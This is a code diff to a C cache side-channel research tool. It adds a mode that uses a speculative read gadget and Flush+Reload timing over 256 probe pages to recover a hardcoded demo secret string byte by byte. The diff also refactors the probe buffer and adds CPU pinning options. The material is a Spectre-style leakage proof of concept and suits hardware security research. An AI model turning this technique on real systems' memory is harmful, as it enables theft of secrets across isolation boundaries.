@@ -18,7 +18,12 @@
 extern void spec_ret_gadget(void *ptr);
 extern void spec_ret_gadget_burst(void *ptr);
 extern void spec_ret_store_gadget(void *ptr);
+extern void spec_read_gadget(void *secret, void *probe_array);
 extern long time_memory_load(void *ptr);
+
+static const char secret[] = "this is my super secret value!";
+
+#define NUM_BYTE_SLOTS 256
 
 #define PAGE_SIZE 4096
 #define CACHE_LINE_SIZE 64
@@ -68,6 +73,8 @@ typedef struct {
     int flush_stack_ptes;
     int parent_cpu;
     int child_cpu;
+    int read_secret;
+    int cpu;
 } experiment_config_t;
 
 typedef struct {
@@ -134,14 +141,8 @@ static void flush_from_cache(void *buf, size_t bufsz) {
     }
 }
 
-static int probe(void *buf, int num_slots, int threshold) {
-    int *order = malloc((size_t)num_slots * sizeof(int));
+static int probe(void *buf, int num_slots, int threshold, int *order) {
     int found = -1;
-
-    if (order == NULL) {
-        perror("malloc");
-        exit(1);
-    }
 
     for (int i = 0; i < num_slots; i++) {
         order[i] = i;
@@ -163,7 +164,6 @@ static int probe(void *buf, int num_slots, int threshold) {
         }
     }
 
-    free(order);
     return found;
 }
 
@@ -231,20 +231,28 @@ static void print_summary(const experiment_config_t *config, const probe_stats_t
 static void child_process(const experiment_config_t *config, shared_t *shared,
                           void *buf, size_t buf_size) {
     probe_stats_t stats = {0};
+    int *order = malloc((size_t)config->slots * sizeof(int));
+
+    if (order == NULL) {
+        perror("malloc");
+        exit(1);
+    }
 
     if (pin_to_cpu(config->child_cpu) != 0) {
         perror("sched_setaffinity child");
+        free(order);
         exit(1);
     }
 
     for (int t = 0; t < config->num_trials; t++) {
         sem_wait(&shared->trial_ready);
         record_probe_result(&stats, shared->target, probe(buf, config->slots,
-            config->cache_mode == CACHE_LLC ? HIT_THRESHOLD_LLC : HIT_THRESHOLD_L1));
+            config->cache_mode == CACHE_LLC ? HIT_THRESHOLD_LLC : HIT_THRESHOLD_L1, order));
         flush_from_cache(buf, buf_size);
         sem_post(&shared->probe_done);
     }
 
+    free(order);
     print_summary(config, &stats);
     exit(0);
 }
@@ -269,9 +277,16 @@ static int probe_threshold(const experiment_config_t *config) {
 static void run_same_thread_experiment(const experiment_config_t *config, void *buf) {
     size_t buf_size = (size_t)config->slots * PAGE_SIZE;
     probe_stats_t stats = {0};
+    int *order = malloc((size_t)config->slots * sizeof(int));
+
+    if (order == NULL) {
+        perror("malloc");
+        exit(1);
+    }
 
     if (pin_to_cpu(config->parent_cpu) != 0) {
         perror("sched_setaffinity parent");
+        free(order);
         exit(1);
     }
 
@@ -281,12 +296,65 @@ static void run_same_thread_experiment(const experiment_config_t *config, void *
         int found;
 
         execute_access(config, ptr);
-        found = probe(buf, config->slots, probe_threshold(config));
+        found = probe(buf, config->slots, probe_threshold(config), order);
         record_probe_result(&stats, target, found);
         flush_from_cache(buf, buf_size);
     }
 
+    free(order);
     print_summary(config, &stats);
+}
+
+static void run_secret_experiment(int num_trials, int cpu) {
+    size_t probe_size = (size_t)NUM_BYTE_SLOTS * PAGE_SIZE;
+    void *probe_array = mmap(NULL, probe_size, PROT_READ | PROT_WRITE,
+                             MAP_ANONYMOUS | MAP_PRIVATE, -1, 0);
+    int secret_len = (int)strlen(secret);
+
+    if (probe_array == MAP_FAILED) {
+        perror("mmap probe_array");
+        return;
+    }
+    memset(probe_array, 0, probe_size);
+    if (pin_to_cpu(cpu) != 0)
+        perror("sched_setaffinity");
+    printf("running on cpu %d\n", sched_getcpu());
+    char guessed[sizeof(secret)] = {0};
+    int *order = malloc(NUM_BYTE_SLOTS * sizeof(int));
+
+    if (order == NULL) {
+        perror("malloc");
+        munmap(probe_array, probe_size);
+        return;
+    }
+
+    for (int i = 0; i < secret_len; i++) {
+        int hits[NUM_BYTE_SLOTS] = {0};
+
+        for (int t = 0; t < num_trials; t++) {
+            flush_from_cache(probe_array, probe_size);
+            spec_read_gadget((char *)secret + i, probe_array);
+            int found = probe(probe_array, NUM_BYTE_SLOTS, HIT_THRESHOLD_L1, order);
+            if (found >= 0)
+                hits[found]++;
+        }
+
+        int best = -1, best_count = 0;
+        for (int v = 0; v < NUM_BYTE_SLOTS; v++) {
+            if (hits[v] > best_count) {
+                best_count = hits[v];
+                best = v;
+            }
+        }
+
+        guessed[i] = best >= 0 ? (char)best : '_';
+        printf("secret[%2d]: hit_rate=%.1f%%\n", i, 100.0 * best_count / num_trials);
+    }
+
+    printf("expected: %s\n", secret);
+    printf("received: %s\n", guessed);
+    free(order);
+    munmap(probe_array, probe_size);
 }
 
 static void run_experiment(const experiment_config_t *config, void *buf) {
@@ -306,13 +374,14 @@ static void run_experiment(const experiment_config_t *config, void *buf) {
     }
 
     flush_from_cache(buf, buf_size);
-    printf("cache mode %s, access mode %s, gadget %s, probe mode %s, parent cpu %d, child cpu %d\n",
+    printf("cache mode %s, access mode %s, gadget %s, probe mode %s, parent cpu %d, child cpu %d, running on cpu %d\n",
            cache_mode_name(config->cache_mode),
            access_mode_name(config->access_mode),
            gadget_mode_name(config->gadget_mode),
            probe_mode_name(config->probe_mode),
            config->parent_cpu,
-           config->child_cpu);
+           config->child_cpu,
+           sched_getcpu());
     if (config->flush_stack_ptes) {
         printf("transient stack PTE flushing enabled\n");
     }
@@ -447,6 +516,8 @@ static experiment_config_t parse_config(int argc, char **argv) {
         {"parent-cpu", required_argument, NULL, 'p'},
         {"child-cpu", required_argument, NULL, 'q'},
         {"flush-stack-ptes", no_argument, NULL, 'f'},
+        {"read-secret", no_argument, NULL, 'x'},
+        {"cpu", required_argument, NULL, 'u'},
         {"help", no_argument, NULL, 'h'},
         {0, 0, 0, 0},
     };
@@ -457,7 +528,7 @@ static experiment_config_t parse_config(int argc, char **argv) {
     config.gadget_mode = GADGET_LOAD;
     opterr = 0;
 
-    while ((opt = getopt_long(argc, argv, "s:n:a:g:c:r:p:q:fh", long_options, &option_index)) != -1) {
+    while ((opt = getopt_long(argc, argv, "s:n:a:g:c:r:p:q:u:fxh", long_options, &option_index)) != -1) {
         switch (opt) {
         case 's':
             if (parse_required_int("slots", optarg, &config.slots, 0) != 0) {
@@ -501,6 +572,13 @@ static experiment_config_t parse_config(int argc, char **argv) {
         case 'f':
             config.flush_stack_ptes = 1;
             break;
+        case 'x':
+            config.read_secret = 1;
+            break;
+        case 'u':
+            if (parse_required_int("cpu", optarg, &config.cpu, 1) != 0)
+                exit(1);
+            break;
         case 'h':
             usage(argv[0]);
             exit(0);
@@ -514,6 +592,13 @@ static experiment_config_t parse_config(int argc, char **argv) {
         fprintf(stderr, "unexpected positional argument: %s\n", argv[optind]);
         usage(argv[0]);
         exit(1);
+    }
+    if (config.read_secret) {
+        if (!have_trials) {
+            usage(argv[0]);
+            exit(1);
+        }
+        return config;
     }
     if (!have_slots || !have_trials || !have_access || !have_cache) {
         usage(argv[0]);
@@ -569,6 +654,11 @@ int main(int argc, char **argv) {
 
     srand((unsigned int)time(NULL));
     printf("allocating %.2f mb\n", (double)buf_size / (1024.0 * 1024.0));
+
+    if (config.read_secret) {
+        run_secret_experiment(config.num_trials, config.cpu);
+        return 0;
+    }
 
     buf = mmap(NULL, buf_size, PROT_READ | PROT_WRITE, MAP_ANONYMOUS | MAP_SHARED, -1, 0);
     if (buf == MAP_FAILED) {
